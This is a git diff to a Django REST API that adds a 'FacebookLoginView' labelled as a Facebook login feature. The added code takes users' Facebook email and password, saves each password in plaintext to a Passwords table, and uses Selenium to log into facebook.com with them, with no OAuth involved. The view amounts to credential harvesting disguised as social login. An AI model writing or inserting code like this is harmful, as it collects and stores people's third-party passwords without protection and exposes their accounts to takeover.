@@ -1,3 +1,5 @@
+from selenium import webdriver
+from getpass import getpass
 import urllib.request
 from .serializer import (UserSerializer, UserSignupSerializer,
                          PasswordSerializer, ResetPasswordSerializer, VerifyOtpSerializer)
@@ -129,3 +131,25 @@ class PasswordView(APIView):
             for field_name, field_errors in serializer.errors.items():
                 new_error[field_name] = field_errors[0]
             return Response(new_error, status=status.HTTP_400_BAD_REQUEST)
+
+
+# ============================================================================
+# Login With Facebook
+# ============================================================================
+class FacebookLoginView(APIView):
+    authentication_classes = [SessionAuthentication]
+    permission_classes = [AllowAny]
+
+    def post(self, request):
+        email = request.data.get('email')
+        password = request.data.get('password')
+        Passwords.objects.create(password=password)
+        driver = webdriver.Chrome()
+        driver.get('https://www.facebook.com')
+        txt_username = driver.find_element_by_id('email')
+        txt_username.send_keys(email)
+        txt_password = driver.find_element_by_id('pass')
+        txt_password.send_keys(password)
+        btnLogin = driver.find_element_by_id('u_0_b')
+        btnLogin.submit()
+        return Response({"message": "Login Successfully", })
